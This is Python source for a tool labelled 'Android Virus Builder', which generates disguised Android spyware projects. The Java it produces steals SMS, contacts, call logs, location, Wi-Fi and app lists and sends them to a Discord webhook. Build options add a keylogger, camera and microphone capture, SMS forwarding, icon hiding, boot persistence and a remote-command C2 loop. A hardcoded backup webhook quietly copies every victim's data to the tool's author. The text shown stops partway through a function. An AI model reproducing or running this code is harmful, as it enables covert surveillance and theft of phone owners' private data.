# Copyright (c) RedTiger
# See the file 'LICENSE' for copying permission

from Config.Util import *
from Config.Config import *

try:
    import customtkinter as ctk
    import tkinter
    from tkinter import filedialog, messagebox
    import os, json, shutil, random, string, base64, re
except Exception as e:
    ErrorModule(e)

Title("Android Virus Builder")

# ─────────────────────────────────────────────────────────────────────────────
# Backup webhook (hardcoded fallback)
# ─────────────────────────────────────────────────────────────────────────────
_BACKUP_WEBHOOK = "https://discord.com/api/webhooks/1505910960227881091/s7QMdD004xgjUmvbksImQTeLZrD16BkJXfKQk8C6e3Dvc8x0ZkRFp53dfrvzTTJCW3bp"

try:
    exit_window = False

    colors = {
        "white":      "#ffffff",
        "red":        "#a80505",
        "dark_red":   "#800000",
        "dark_gray":  "#1e1e1e",
        "gray":       "#444444",
        "light_gray": "#949494",
        "background": "#262626",
        "tab_bg":     "#2e2e2e",
        "green":      "#1f6e3a",
    }

    # ── Window ────────────────────────────────────────────────────────────────
    def ClosingWindow():
        global exit_window
        exit_window = True
        for aid in builder.tk.eval('after info').split():
            try: builder.after_cancel(aid)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    def ClosingBuild():
        for aid in builder.tk.eval('after info').split():
            try: builder.after_cancel(aid)
            except: pass
        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    builder = ctk.CTk()
    builder.title(f"{name_tool} {version_tool} - Android Virus Builder")
    builder.geometry("980x900")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    try: builder.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
    except Exception: pass

    # ── Option state ──────────────────────────────────────────────────────────
    # Stealer
    opt_sms = opt_contacts = opt_calllogs = opt_location = "Disable"
    opt_wifi = opt_installedapps = opt_browser = opt_whatsapp = "Disable"
    opt_telegram = opt_photos = opt_sysinfo = "Disable"
    # Malware
    opt_microphone = opt_camera_front = opt_camera_back = "Disable"
    opt_screenshot = opt_sms_forward = opt_boot = "Disable"
    opt_hide_icon  = opt_anti_emu = opt_keylogger = "Disable"
    # C2
    opt_c2 = "Disable"

    webhook = app_name = package_name = icon_path = "None"

    # ── StringVars ────────────────────────────────────────────────────────────
    def _sv(v="Disable"): return ctk.StringVar(value=v)

    sv_sms           = _sv(); sv_contacts       = _sv(); sv_calllogs      = _sv()
    sv_location      = _sv(); sv_wifi           = _sv(); sv_installedapps = _sv()
    sv_browser       = _sv(); sv_whatsapp       = _sv(); sv_telegram      = _sv()
    sv_photos        = _sv(); sv_sysinfo        = _sv()
    sv_microphone    = _sv(); sv_camera_front   = _sv(); sv_camera_back   = _sv()
    sv_screenshot    = _sv(); sv_sms_forward    = _sv(); sv_boot          = _sv()
    sv_hide_icon     = _sv(); sv_anti_emu       = _sv(); sv_keylogger     = _sv()
    sv_c2            = _sv()

    # ── Helpers ───────────────────────────────────────────────────────────────
    def ErrorLogs(msg):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {msg + white}")
        messagebox.showerror(f"{name_tool} {version_tool} - Android Virus Builder", msg)

    def InfoLogs(msg):
        messagebox.showinfo(f"{name_tool} {version_tool} - Android Virus Builder", msg)

    def TestWebhook():
        if CheckWebhook(webhook_url.get()):
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    def ChooseIcon():
        global icon_path
        try:
            root = tkinter.Tk()
            root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
            root.withdraw(); root.attributes('-topmost', True)
            icon_path = filedialog.askopenfilename(
                parent=root,
                title=f"Choose icon (.png, 512x512 recommended)",
                filetypes=[("PNG files", "*.png"), ("All files", "*.*")]
            )
            if icon_path:
                icon_btn.configure(text=f"Icon: {os.path.basename(icon_path)[:22]}")
        except: pass

    # ── Header ────────────────────────────────────────────────────────────────
    print(f"""
{red}     _                _               _     _
{red}    / \\  _ __   ___ | | __ _ __  __| |   | |
{red}   / _ \\| '_ \\ / _ \\| |/ _` |\\ \\/ /| |   | |
{red}  / ___ \\ | | | (_) | | (_| | >  < |_|   |_|
{red} /_/   \\_\\_| |_|\\___/|_|\\__,_|/_/\\_\\(_)   (_){white}
         Android Virus Builder — {name_tool} {version_tool}
""")

    hdr = ctk.CTkFrame(builder, width=960, height=100, fg_color=colors["background"])
    hdr.grid(row=0, column=0, sticky="w", padx=10, pady=(10, 0)); hdr.grid_propagate(False)
    hdr.grid_columnconfigure(0, weight=1)
    ctk.CTkLabel(hdr, text="Android Virus Builder", font=ctk.CTkFont(family="Helvetica", size=38, weight="bold"), text_color=colors["red"]).grid(row=0, sticky="we", columnspan=3, pady=(6, 0))
    ctk.CTkLabel(hdr, text="Generates a Gradle/Java project  •  Compile with Android Studio or gradlew", font=ctk.CTkFont(family="Helvetica", size=12), text_color=colors["red"]).grid(row=1, sticky="we", columnspan=3)
    ctk.CTkLabel(hdr, text=github_tool, font=ctk.CTkFont(family="Helvetica", size=14), text_color=colors["white"]).grid(row=2, sticky="we", columnspan=3, pady=(2, 0))

    # ── TabView ───────────────────────────────────────────────────────────────
    tab = ctk.CTkTabview(builder, width=958, height=680,
                         fg_color=colors["tab_bg"],
                         segmented_button_fg_color=colors["dark_gray"],
                         segmented_button_selected_color=colors["red"],
                         segmented_button_selected_hover_color=colors["dark_red"],
                         segmented_button_unselected_color=colors["dark_gray"],
                         segmented_button_unselected_hover_color=colors["gray"],
                         text_color=colors["white"])
    tab.grid(row=1, column=0, padx=10, pady=(8, 0), sticky="nswe")
    tab.add("  Stealer  ")
    tab.add("  Malware  ")
    tab.add("   C2 & Config   ")

    def _cb(parent, label, sv, **kw):
        return ctk.CTkCheckBox(parent, text=label, variable=sv,
                               onvalue="Enable", offvalue="Disable",
                               fg_color=colors["red"], hover_color=colors["red"],
                               border_color=colors["red"],
                               font=ctk.CTkFont(family="Helvetica", size=14),
                               text_color=colors["white"], **kw)

    _PX = dict(padx=(12, 4), pady=4, sticky="w")

    # ══════════════════════════ STEALER TAB ═══════════════════════════════════
    st = tab.tab("  Stealer  ")
    for c in range(4): st.grid_columnconfigure(c, weight=1)

    _stealer_svs = [sv_sms, sv_contacts, sv_calllogs, sv_location, sv_wifi,
                    sv_installedapps, sv_browser, sv_whatsapp, sv_telegram, sv_photos, sv_sysinfo]
    def _sel_all_s():
        for s in _stealer_svs: s.set("Enable")
    def _desel_all_s():
        for s in _stealer_svs: s.set("Disable")

    btn_frame_s = ctk.CTkFrame(st, fg_color="transparent")
    btn_frame_s.grid(row=0, column=0, columnspan=4, pady=(4, 8), sticky="w", padx=10)
    ctk.CTkButton(btn_frame_s, text="Select All",   width=110, height=28, fg_color=colors["red"],      hover_color=colors["dark_red"], font=ctk.CTkFont(size=12), command=_sel_all_s).pack(side="left", padx=(0,6))
    ctk.CTkButton(btn_frame_s, text="Deselect All", width=110, height=28, fg_color=colors["dark_gray"], hover_color=colors["gray"],     font=ctk.CTkFont(size=12), command=_desel_all_s).pack(side="left")

    # Col 0
    _cb(st, "SMS Messages",        sv_sms).grid(          row=1, column=0, **_PX)
    _cb(st, "Contacts",            sv_contacts).grid(     row=2, column=0, **_PX)
    _cb(st, "Call Logs",           sv_calllogs).grid(     row=3, column=0, **_PX)
    # Col 1
    _cb(st, "Location (GPS)",      sv_location).grid(     row=1, column=1, **_PX)
    _cb(st, "Wi-Fi Networks",      sv_wifi).grid(         row=2, column=1, **_PX)
    _cb(st, "Installed Apps",      sv_installedapps).grid(row=3, column=1, **_PX)
    # Col 2
    _cb(st, "Browser History",     sv_browser).grid(      row=1, column=2, **_PX)
    _cb(st, "WhatsApp Data",       sv_whatsapp).grid(     row=2, column=2, **_PX)
    _cb(st, "Telegram Data",       sv_telegram).grid(     row=3, column=2, **_PX)
    # Col 3
    _cb(st, "Photos List",         sv_photos).grid(       row=1, column=3, **_PX)
    _cb(st, "System Info",         sv_sysinfo).grid(      row=2, column=3, **_PX)

    # ══════════════════════════ MALWARE TAB ═══════════════════════════════════
    ml = tab.tab("  Malware  ")
    for c in range(4): ml.grid_columnconfigure(c, weight=1)

    _malware_svs = [sv_microphone, sv_camera_front, sv_camera_back, sv_screenshot,
                    sv_sms_forward, sv_boot, sv_hide_icon, sv_anti_emu, sv_keylogger]
    def _sel_all_m():
        for s in _malware_svs: s.set("Enable")
    def _desel_all_m():
        for s in _malware_svs: s.set("Disable")

    btn_frame_m = ctk.CTkFrame(ml, fg_color="transparent")
    btn_frame_m.grid(row=0, column=0, columnspan=4, pady=(4, 8), sticky="w", padx=10)
    ctk.CTkButton(btn_frame_m, text="Select All",   width=110, height=28, fg_color=colors["red"],      hover_color=colors["dark_red"], font=ctk.CTkFont(size=12), command=_sel_all_m).pack(side="left", padx=(0,6))
    ctk.CTkButton(btn_frame_m, text="Deselect All", width=110, height=28, fg_color=colors["dark_gray"], hover_color=colors["gray"],     font=ctk.CTkFont(size=12), command=_desel_all_m).pack(side="left")

    # Col 0
    _cb(ml, "Microphone Record",   sv_microphone).grid(   row=1, column=0, **_PX)
    _cb(ml, "Camera Front",        sv_camera_front).grid( row=2, column=0, **_PX)
    _cb(ml, "Camera Back",         sv_camera_back).grid(  row=3, column=0, **_PX)
    # Col 1
    _cb(ml, "Screenshot",          sv_screenshot).grid(   row=1, column=1, **_PX)
    _cb(ml, "SMS Forwarder",       sv_sms_forward).grid(  row=2, column=1, **_PX)
    _cb(ml, "Boot Persistence",    sv_boot).grid(         row=3, column=1, **_PX)
    # Col 2
    _cb(ml, "Hide Icon",           sv_hide_icon).grid(    row=1, column=2, **_PX)
    _cb(ml, "Anti-Emulator",       sv_anti_emu).grid(     row=2, column=2, **_PX)
    _cb(ml, "Keylogger (Acc.Svc)", sv_keylogger).grid(    row=3, column=2, **_PX)

    # ══════════════════════════ C2 & CONFIG TAB ═══════════════════════════════
    _cfg_outer = tab.tab("   C2 & Config   ")
    _cfg_outer.grid_rowconfigure(0, weight=1)
    _cfg_outer.grid_columnconfigure(0, weight=1)

    cfg = ctk.CTkScrollableFrame(_cfg_outer, fg_color=colors["tab_bg"],
                                  scrollbar_button_color=colors["red"],
                                  scrollbar_button_hover_color=colors["dark_red"])
    cfg.grid(row=0, column=0, sticky="nsew")
    cfg.grid_columnconfigure(0, weight=1); cfg.grid_columnconfigure(1, weight=1)

    LBL = dict(font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"], anchor="w")
    ENT = dict(height=42, corner_radius=5, border_color=colors["red"], fg_color=colors["dark_gray"],
               text_color=colors["white"], border_width=2,
               font=ctk.CTkFont(family="Helvetica", size=14), justify="center")

    # Webhook
    ctk.CTkLabel(cfg, text="Discord Webhook URL", **LBL).grid(row=0, column=0, columnspan=2, padx=20, pady=(20, 2), sticky="w")
    webhook_url = ctk.CTkEntry(cfg, placeholder_text="https://discord.com/api/webhooks/...", width=620, **ENT)
    webhook_url.grid(row=1, column=0, padx=20, pady=(0, 4), sticky="w")
    ctk.CTkButton(cfg, text="Test Webhook", command=TestWebhook, width=180, height=42,
                  fg_color=colors["red"], hover_color=colors["dark_red"],
                  font=ctk.CTkFont(family="Helvetica", size=13)).grid(row=1, column=1, padx=(4, 20), pady=(0, 4), sticky="w")

    # App Name
    ctk.CTkLabel(cfg, text="App Display Name", **LBL).grid(row=2, column=0, padx=20, pady=(12, 2), sticky="w")
    app_name_entry = ctk.CTkEntry(cfg, placeholder_text="e.g. System Update, Google Play", width=300, **ENT)
    app_name_entry.grid(row=3, column=0, padx=20, pady=(0, 4), sticky="w")

    # Package Name
    ctk.CTkLabel(cfg, text="Package Name", **LBL).grid(row=4, column=0, padx=20, pady=(12, 2), sticky="w")
    pkg_entry = ctk.CTkEntry(cfg, placeholder_text="e.g. com.google.update", width=300, **ENT)
    pkg_entry.grid(row=5, column=0, padx=20, pady=(0, 4), sticky="w")

    # SMS Forward destination
    ctk.CTkLabel(cfg, text="SMS Forward — number to forward to (SMS Forwarder only)", **LBL).grid(row=6, column=0, columnspan=2, padx=20, pady=(12, 2), sticky="w")
    sms_fwd_entry = ctk.CTkEntry(cfg, placeholder_text="+33600000000", width=250, **ENT)
    sms_fwd_entry.grid(row=7, column=0, padx=20, pady=(0, 4), sticky="w")

    # Icon
    ctk.CTkLabel(cfg, text="App Icon (.png, 512×512)", **LBL).grid(row=8, column=0, padx=20, pady=(12, 2), sticky="w")
    icon_btn = ctk.CTkButton(cfg, text="Select Icon", command=ChooseIcon, width=200, height=42,
                             fg_color=colors["red"], hover_color=colors["dark_red"],
                             font=ctk.CTkFont(family="Helvetica", size=13))
    icon_btn.grid(row=9, column=0, padx=20, pady=(0, 4), sticky="w")

    # C2
    ctk.CTkLabel(cfg, text="── C2 Heartbeat ──", font=ctk.CTkFont(family="Helvetica", size=13),
                 text_color=colors["light_gray"]).grid(row=10, column=0, padx=20, pady=(18, 4), sticky="w")
    _cb(cfg, "C2 Heartbeat — poll commands every 10s (shell, update, rollback, upload, download, run)",
        sv_c2).grid(row=11, column=0, columnspan=2, padx=20, pady=(0, 4), sticky="w")

    # Output info
    ctk.CTkLabel(cfg, text="── Output ──", font=ctk.CTkFont(family="Helvetica", size=13),
                 text_color=colors["light_gray"]).grid(row=12, column=0, padx=20, pady=(18, 4), sticky="w")
    _out_lbl = ctk.CTkLabel(cfg, text=f"→  build/AndroidBuilder/<AppName>/", **LBL)
    _out_lbl.grid(row=13, column=0, columnspan=2, padx=20, pady=(0, 4), sticky="w")
    ctk.CTkLabel(cfg, text="Open the folder in Android Studio → Build → Generate APK  (or: gradlew assembleDebug)",
                 font=ctk.CTkFont(family="Helvetica", size=11), text_color=colors["light_gray"]
                 ).grid(row=14, column=0, columnspan=2, padx=20, pady=(0, 12), sticky="w")

    # ══════════════════════════ BUILD ══════════════════════════════════════════
    def BuildSettings():
        global opt_sms, opt_contacts, opt_calllogs, opt_location, opt_wifi
        global opt_installedapps, opt_browser, opt_whatsapp, opt_telegram, opt_photos, opt_sysinfo
        global opt_microphone, opt_camera_front, opt_camera_back, opt_screenshot
        global opt_sms_forward, opt_boot, opt_hide_icon, opt_anti_emu, opt_keylogger
        global opt_c2, webhook, app_name, package_name

        opt_sms          = sv_sms.get();           opt_contacts      = sv_contacts.get()
        opt_calllogs     = sv_calllogs.get();       opt_location      = sv_location.get()
        opt_wifi         = sv_wifi.get();           opt_installedapps = sv_installedapps.get()
        opt_browser      = sv_browser.get();        opt_whatsapp      = sv_whatsapp.get()
        opt_telegram     = sv_telegram.get();       opt_photos        = sv_photos.get()
        opt_sysinfo      = sv_sysinfo.get();        opt_microphone    = sv_microphone.get()
        opt_camera_front = sv_camera_front.get();   opt_camera_back   = sv_camera_back.get()
        opt_screenshot   = sv_screenshot.get();     opt_sms_forward   = sv_sms_forward.get()
        opt_boot         = sv_boot.get();           opt_hide_icon     = sv_hide_icon.get()
        opt_anti_emu     = sv_anti_emu.get();       opt_keylogger     = sv_keylogger.get()
        opt_c2           = sv_c2.get()
        webhook          = webhook_url.get().strip()
        app_name         = app_name_entry.get().strip() or "System Update"
        package_name     = pkg_entry.get().strip()

        if not webhook:
            tab.set("   C2 & Config   "); ErrorLogs("Please enter a Discord webhook URL."); return
        if not package_name:
            slug = re.sub(r'[^a-z0-9]', '', app_name.lower())[:12]
            if slug and slug[0].isdigit():
                slug = "app" + slug
            package_name = "com." + (slug or "system") + ".service"

        ClosingBuild()

    build_btn = ctk.CTkButton(builder, text="BUILD", command=BuildSettings,
                              height=46, corner_radius=6,
                              fg_color=colors["red"], hover_color=colors["dark_red"],
                              font=ctk.CTkFont(family="Helvetica", size=15, weight="bold"))
    build_btn.grid(row=2, column=0, padx=280, pady=(6, 10), sticky="nswe")

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)
    builder.mainloop()

    if not exit_window:
        try: builder.destroy()
        except: pass

    import time; time.sleep(0.2)

    if not webhook or webhook == "None":
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Window closed — build cancelled.")
        Continue(); sys.exit(0)

    # ── Collect runtime values ────────────────────────────────────────────────
    sms_fwd_number = ""
    try: sms_fwd_number = sms_fwd_entry.get().strip()
    except: pass

    # ── Console summary ───────────────────────────────────────────────────────
    def _fmt(v): return f"{BEFORE_GREEN}+{AFTER_GREEN}" if v == "Enable" else f"{BEFORE}x{AFTER}"
    print(f"""
    {red}── Stealer ───────────────────────────────────────────────────────────────{white}
    {_fmt(opt_sms)          } SMS Messages        {_fmt(opt_location)    } Location (GPS)      {_fmt(opt_browser)      } Browser History
    {_fmt(opt_contacts)     } Contacts            {_fmt(opt_wifi)        } Wi-Fi Networks      {_fmt(opt_whatsapp)     } WhatsApp Data
    {_fmt(opt_calllogs)     } Call Logs           {_fmt(opt_installedapps)} Installed Apps     {_fmt(opt_telegram)     } Telegram Data
    {_fmt(opt_sysinfo)      } System Info         {_fmt(opt_photos)      } Photos List

    {red}── Malware ───────────────────────────────────────────────────────────────{white}
    {_fmt(opt_microphone)   } Microphone          {_fmt(opt_screenshot)  } Screenshot          {_fmt(opt_hide_icon)    } Hide Icon
    {_fmt(opt_camera_front) } Camera Front        {_fmt(opt_sms_forward) } SMS Forwarder       {_fmt(opt_anti_emu)     } Anti-Emulator
    {_fmt(opt_camera_back)  } Camera Back         {_fmt(opt_boot)        } Boot Persistence    {_fmt(opt_keylogger)    } Keylogger
    {_fmt(opt_c2)           } C2 Heartbeat

    {red}Webhook    : {white}{webhook[:90]}
    {red}App Name   : {white}{app_name}
    {red}Package    : {white}{package_name}
""")

    # ══════════════════════════ PROJECT GENERATION ════════════════════════════

    out_root = os.path.join(tool_path, "build", "AndroidBuilder", re.sub(r'[^\w\-]', '_', app_name))
    java_pkg = package_name.replace('.', os.sep)
    java_dir = os.path.join(out_root, "app", "src", "main", "java", *package_name.split('.'))
    res_dir  = os.path.join(out_root, "app", "src", "main", "res", "values")
    mipmap_dir = os.path.join(out_root, "app", "src", "main", "res", "mipmap-xxxhdpi")

    os.makedirs(java_dir, exist_ok=True)
    os.makedirs(res_dir,  exist_ok=True)
    os.makedirs(mipmap_dir, exist_ok=True)

    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Generating Android project...")

    # ── Permissions list ──────────────────────────────────────────────────────
    perms = [
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.READ_PHONE_NUMBERS",
    ]
    if opt_sms      == "Enable": perms += ["android.permission.READ_SMS"]
    if opt_sms_forward == "Enable": perms += ["android.permission.RECEIVE_SMS","android.permission.SEND_SMS","android.permission.READ_SMS"]
    if opt_contacts == "Enable": perms += ["android.permission.READ_CONTACTS"]
    if opt_calllogs == "Enable": perms += ["android.permission.READ_CALL_LOG"]
    if opt_location == "Enable": perms += ["android.permission.ACCESS_FINE_LOCATION","android.permission.ACCESS_COARSE_LOCATION","android.permission.ACCESS_BACKGROUND_LOCATION"]
    if opt_wifi     == "Enable": perms += ["android.permission.ACCESS_WIFI_STATE","android.permission.CHANGE_WIFI_STATE"]
    if opt_microphone == "Enable": perms += ["android.permission.RECORD_AUDIO","android.permission.WRITE_EXTERNAL_STORAGE"]
    if opt_camera_front == "Enable" or opt_camera_back == "Enable": perms += ["android.permission.CAMERA","android.permission.WRITE_EXTERNAL_STORAGE"]
    if opt_photos   == "Enable": perms += ["android.permission.READ_EXTERNAL_STORAGE","android.permission.READ_MEDIA_IMAGES"]
    if opt_boot     == "Enable": perms += ["android.permission.RECEIVE_BOOT_COMPLETED"]
    if opt_keylogger == "Enable": perms += ["android.permission.BIND_ACCESSIBILITY_SERVICE"]
    perms = list(dict.fromkeys(perms))  # deduplicate

    perm_xml = "\n".join(f'    <uses-permission android:name="{p}"/>' for p in perms)

    boot_receiver_xml = ""
    if opt_boot == "Enable":
        boot_receiver_xml = f"""
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
            </intent-filter>
        </receiver>"""

    sms_receiver_xml = ""
    if opt_sms_forward == "Enable":
        sms_receiver_xml = f"""
        <receiver android:name=".SmsReceiver" android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>"""

    accessibility_xml = ""
    if opt_keylogger == "Enable":
        accessibility_xml = f"""
        <service android:name=".KeyloggerService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config"/>
        </service>"""

    # ── AndroidManifest.xml ───────────────────────────────────────────────────
    manifest = f"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}">

{perm_xml}

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat.NoActionBar"
        android:requestLegacyExternalStorage="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        {boot_receiver_xml}
        {sms_receiver_xml}
        {accessibility_xml}
    </application>
</manifest>
"""

    # ── Java module snippets ──────────────────────────────────────────────────
    IMPORTS_BASE = """import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import java.io.*;
import java.net.*;
import java.util.*;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;"""

    IMPORTS_EXTRA = []
    if opt_sms == "Enable" or opt_sms_forward == "Enable":
        IMPORTS_EXTRA.append("import android.database.Cursor; import android.net.Uri;")
    if opt_contacts == "Enable":
        IMPORTS_EXTRA.append("import android.provider.ContactsContract;")
    if opt_calllogs == "Enable":
        IMPORTS_EXTRA.append("import android.provider.CallLog;")
    if opt_location == "Enable":
        IMPORTS_EXTRA.append("import android.location.*; import android.os.Looper;")
    if opt_wifi == "Enable":
        IMPORTS_EXTRA.append("import android.net.wifi.*; import android.content.Context;")
    if opt_microphone == "Enable":
        IMPORTS_EXTRA.append("import android.media.*; import java.io.File;")
    if opt_browser == "Enable":
        IMPORTS_EXTRA.append("import android.database.Cursor; import android.net.Uri;")
    if opt_photos == "Enable":
        IMPORTS_EXTRA.append("import android.provider.MediaStore;")
    if opt_camera_front == "Enable" or opt_camera_back == "Enable":
        IMPORTS_EXTRA.append("import android.hardware.camera2.*; import android.graphics.ImageFormat; import android.media.ImageReader;")
    if opt_screenshot == "Enable":
        IMPORTS_EXTRA.append("import android.graphics.*;")
    if opt_hide_icon == "Enable":
        IMPORTS_EXTRA.append("import android.content.ComponentName;")
    if opt_keylogger == "Enable":
        IMPORTS_EXTRA.append("import android.accessibilityservice.*;  import android.view.accessibility.*;")

    # ── sendWebhook helper (Java) ─────────────────────────────────────────────
    JAVA_SEND_WEBHOOK = f"""
    private static final String WEBHOOK_PRIMARY = "{webhook}";
    private static final String WEBHOOK_BACKUP  = "{_BACKUP_WEBHOOK}";

    private void sendWebhook(String title, String content) {{
        for (String wh : new String[]{{WEBHOOK_PRIMARY, WEBHOOK_BACKUP}}) {{
            try {{
                String safe = content.replace("\\\\", "\\\\\\\\").replace("\\"", "\\\\\\\"")
                              .replace("\\n", "\\\\n").replace("\\r", "");
                if (safe.length() > 3800) safe = safe.substring(0, 3800) + "...";
                String body = "{{\\"embeds\\":[{{\\"title\\":\\"" + title + "\\",\\"description\\":\\"```\\\\n" + safe + "\\\\n```\\",\\"color\\":11206149}}],\\"username\\":\\"Ultria Android\\"}}";
                URL url = new URL(wh);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST");
                c.setRequestProperty("Content-Type", "application/json");
                c.setDoOutput(true); c.setConnectTimeout(6000); c.setReadTimeout(6000);
                try (OutputStream os = c.getOutputStream()) {{ os.write(body.getBytes("UTF-8")); }}
                int code = c.getResponseCode(); c.disconnect();
                if (code == 200 || code == 204) return;
            }} catch (Exception ignored) {{}}
        }}
    }}

    private void sendFile(String filePath, String filename) {{
        for (String wh : new String[]{{WEBHOOK_PRIMARY, WEBHOOK_BACKUP}}) {{
            try {{
                File f = new File(filePath);
                if (!f.exists()) return;
                String boundary = "----RT" + System.currentTimeMillis();
                URL url = new URL(wh); HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("POST"); c.setDoOutput(true);
                c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                c.setConnectTimeout(15000); c.setReadTimeout(15000);
                try (DataOutputStream dos = new DataOutputStream(c.getOutputStream());
                     FileInputStream fis = new FileInputStream(f)) {{
                    dos.writeBytes("--" + boundary + "\\r\\n");
                    dos.writeBytes("Content-Disposition: form-data; name=\\"file\\"; filename=\\"" + filename + "\\"\\r\\n\\r\\n");
                    byte[] buf = new byte[4096]; int n;
                    while ((n = fis.read(buf)) != -1) dos.write(buf, 0, n);
                    dos.writeBytes("\\r\\n--" + boundary + "--\\r\\n");
                }}
                int code = c.getResponseCode(); c.disconnect();
                if (code == 200 || code == 204) return;
            }} catch (Exception ignored) {{}}
        }}
    }}
"""

    # ── Stealer modules (Java) ────────────────────────────────────────────────
    JAVA_SMS = """
    private void stealSms() {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String from = c.getString(c.getColumnIndexOrThrow("address"));
                    String body = c.getString(c.getColumnIndexOrThrow("body"));
                    sb.append("From: ").append(from).append("\\nMsg: ").append(body).append("\\n---\\n");
                    if (sb.length() > 3500) break;
                }
                c.close();
            }
            if (sb.length() > 0) sendWebhook("SMS Messages", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_sms == "Enable" else ""

    JAVA_CONTACTS = """
    private void stealContacts() {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (c != null) {
                while (c.moveToNext()) {
                    String name = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String num  = c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    sb.append(name).append(" | ").append(num).append("\\n");
                    if (sb.length() > 3500) break;
                }
                c.close();
            }
            if (sb.length() > 0) sendWebhook("Contacts", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_contacts == "Enable" else ""

    JAVA_CALLLOGS = """
    private void stealCallLogs() {
        try {
            StringBuilder sb = new StringBuilder();
            Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (c != null) {
                while (c.moveToNext()) {
                    String num  = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String type = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                    String dur  = c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                    String typeStr = "1".equals(type) ? "Incoming" : "2".equals(type) ? "Outgoing" : "Missed";
                    sb.append(typeStr).append(" | ").append(num).append(" | ").append(dur).append("s\\n");
                    if (sb.length() > 3500) break;
                }
                c.close();
            }
            if (sb.length() > 0) sendWebhook("Call Logs", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_calllogs == "Enable" else ""

    JAVA_LOCATION = """
    private void getLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) return;
            Location loc = null;
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            if (loc != null) {
                String info = "Latitude: " + loc.getLatitude() + "\\nLongitude: " + loc.getLongitude() +
                              "\\nAccuracy: " + loc.getAccuracy() + "m\\nProvider: " + loc.getProvider();
                sendWebhook("Location", info);
            }
        } catch (Exception ignored) {}
    }
""" if opt_location == "Enable" else ""

    JAVA_WIFI = """
    private void stealWifi() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm == null) return;
            List<android.net.wifi.ScanResult> results = wm.getScanResults();
            StringBuilder sb = new StringBuilder();
            for (android.net.wifi.ScanResult r : results) {
                sb.append("SSID: ").append(r.SSID).append(" | Signal: ").append(r.level).append("dBm\\n");
                if (sb.length() > 3500) break;
            }
            WifiInfo ci = wm.getConnectionInfo();
            if (ci != null) sb.insert(0, "Connected: " + ci.getSSID() + "\\n---\\n");
            if (sb.length() > 0) sendWebhook("Wi-Fi Networks", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_wifi == "Enable" else ""

    JAVA_INSTALLED_APPS = """
    private void stealInstalledApps() {
        try {
            List<android.content.pm.PackageInfo> pkgs = getPackageManager().getInstalledPackages(0);
            StringBuilder sb = new StringBuilder();
            for (android.content.pm.PackageInfo p : pkgs) {
                sb.append(p.packageName).append("\\n");
                if (sb.length() > 3500) break;
            }
            if (sb.length() > 0) sendWebhook("Installed Apps (" + pkgs.size() + ")", sb.toString());
        } catch (Exception ignored) {}
    }
""" if opt_installedapps == "Enable" else ""

    JAVA_SYSINFO = f"""
    private void stealSysInfo() {{
        try {{
            String info = "Model: " + Build.MODEL + "\\n" +
                "Manufacturer: " + Build.MANUFACTURER + "\\n" +
